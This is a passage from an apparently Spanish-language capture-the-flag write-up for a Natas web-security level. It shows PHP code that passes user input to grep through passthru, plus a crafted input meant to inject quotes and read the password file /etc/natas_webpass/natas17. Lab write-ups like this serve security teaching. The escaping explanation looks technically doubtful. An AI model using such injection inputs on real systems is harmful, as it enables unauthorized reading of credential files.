Si inspeccionamos el HTML, vemos que es similar al del nivel 10. Al obtener el
código, notamos que ahora hay aún mas restricciones con respecto a la entrada
del usuario:

```php
if(preg_match('/[;|&`\'"]/',$key)) {
    print "Input contains an illegal character!";
} else {
    passthru("grep -i \"$key\" dictionary.txt");
}
```

Entre los simbolos que podemos utilizar, esta el `\`. Este se utiliza en PHP
para escapar ciertos simbolos, por lo que podemos así introducir el caracter `"`
con su código ANSI: `\x22`.

Trataremos de ejecutar el comando:

```bash
$ grep -i "" "/etc/natas_webpass/natas17" dictionary.txt
```

Para eso, enviaremos al servidor la cadena:

```txt
\x22 \x22/etc/natas_webpass/natas17
```
